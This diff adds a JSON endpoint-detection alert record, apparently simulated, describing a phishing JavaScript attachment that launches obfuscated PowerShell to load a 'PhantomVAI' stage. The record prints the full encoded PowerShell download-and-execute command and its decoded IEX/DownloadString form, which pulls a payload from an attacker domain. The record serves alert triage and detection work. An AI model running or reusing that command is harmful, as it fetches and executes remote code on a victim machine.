@@ -1,0 +1,73 @@
+{
+  "vendor": "Palo Alto Networks",
+  "product": "Cortex XDR",
+  "severity": "High",
+  "category": "Execution",
+  "alert_name": "Obfuscated PowerShell Script Execution from JavaScript File",
+  "description": "Suspicious execution of heavily obfuscated PowerShell script detected on workstation ACCT-WKS-047 (10.30.25.88) 10 minutes after phishing email delivery. User mthomas@techcorp.local opened malicious JavaScript file 'Invoice_8821_Details.js' from ZIP attachment, triggering Windows Script Host (wscript.exe) to execute embedded Base64-encoded PowerShell command. The PowerShell script uses multiple layers of obfuscation including Base64 encoding, string concatenation, and character substitution to evade detection. Deobfuscated command reveals download operation: 'IEX (New-Object Net.WebClient).DownloadString(hxxps://cdn.contentdelivery[.]cloud/images/banner_v2.gif)'. The script attempts to download next-stage payload disguised as GIF image file from attacker-controlled CDN. PowerShell executed with hidden window style (-WindowStyle Hidden) and bypassed execution policy (-ExecutionPolicy Bypass). Command line analysis shows classic PhantomVAI Loader delivery mechanism as documented in Unit 42 threat intelligence. Parent process wscript.exe (PID 8234) spawned powershell.exe (PID 9127) with suspicious parameters.",
+  "relative_timestamp_hours": 47.83,
+  "campaign_name": "PhantomVAI-TechCorp",
+  "host_name": "ACCT-WKS-047",
+  "host_ip": [
+    171540568
+  ],
+  "host_os": "AGENT_OS_WINDOWS",
+  "user_name": [
+    "mthomas@techcorp.local"
+  ],
+  "account_id": "S-1-5-21-4567891234-1234567890-0987654321-2145",
+  "domain": "techcorp.local",
+  "cgo_name": [
+    "powershell.exe"
+  ],
+  "cgo_cmd": [
+    "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKABoAHgAeABwAHMAOgAvAC8AYwBkAG4ALgBjAG8AbgB0AGUAbgB0AGQAZQBsAGkAdgBlAHIAeQAuAGMAbABvAHUAZAAvAGkAbQBhAGcAZQBzAC8AYgBhAG4AbgBlAHIAXwB2ADIALgBnAGkAZgApAA=="
+  ],
+  "cgo_path": [
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+  ],
+  "cgo_pid": [
+    9127
+  ],
+  "os_parent_name": [
+    "wscript.exe"
+  ],
+  "os_parent_cmd": [
+    "C:\\Windows\\System32\\wscript.exe C:\\Users\\mthomas\\Downloads\\Invoice_8821_Details.js"
+  ],
+  "os_parent_pid": [
+    8234
+  ],
+  "file_name": [
+    "Invoice_8821_Details.js"
+  ],
+  "file_path": [
+    "C:\\Users\\mthomas\\Downloads\\Invoice_8821_Details.js"
+  ],
+  "file_hash": "02aa167e4bb41e3e40a75954f5a0bd5915f9a16fd6c21b544a557f2a7df3c89b",
+  "file_sha256": [
+    "02aa167e4bb41e3e40a75954f5a0bd5915f9a16fd6c21b544a557f2a7df3c89b"
+  ],
+  "initiator_sha256": [
+    "02aa167e4bb41e3e40a75954f5a0bd5915f9a16fd6c21b544a557f2a7df3c89b"
+  ],
+  "filesize": "12288",
+  "url": [
+    "https://cdn.contentdelivery.cloud/images/banner_v2.gif"
+  ],
+  "threat_name": "PhantomVAI Loader - PowerShell Stage",
+  "attack_mode": "Obfuscated PowerShell Execution",
+  "verdict": "Malicious",
+  "risk_score": "88",
+  "risk_rating": "High",
+  "host_risk_level": "High",
+  "policy_type": "Endpoint Protection",
+  "policy_description": "Obfuscated PowerShell download - PhantomVAI Loader stage 2",
+  "policy_severity": "High",
+  "policy_recommendation": "Kill powershell.exe process immediately, block domain cdn.contentdelivery[.]cloud, isolate ACCT-WKS-047, scan for downloaded GIF payload, enable PowerShell script block logging, implement application whitelisting, investigate network connections to CDN infrastructure",
+  "log_source": "Cortex XDR Agent",
+  "event_id": "PROCESS_EXECUTION",
+  "external_link": "https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/",
+  "mitre_att&ck_tactic": "TA0002 - Execution",
+  "mitre_att&ck_technique": "T1059.001 - Command and Scripting Interpreter: PowerShell"
+}
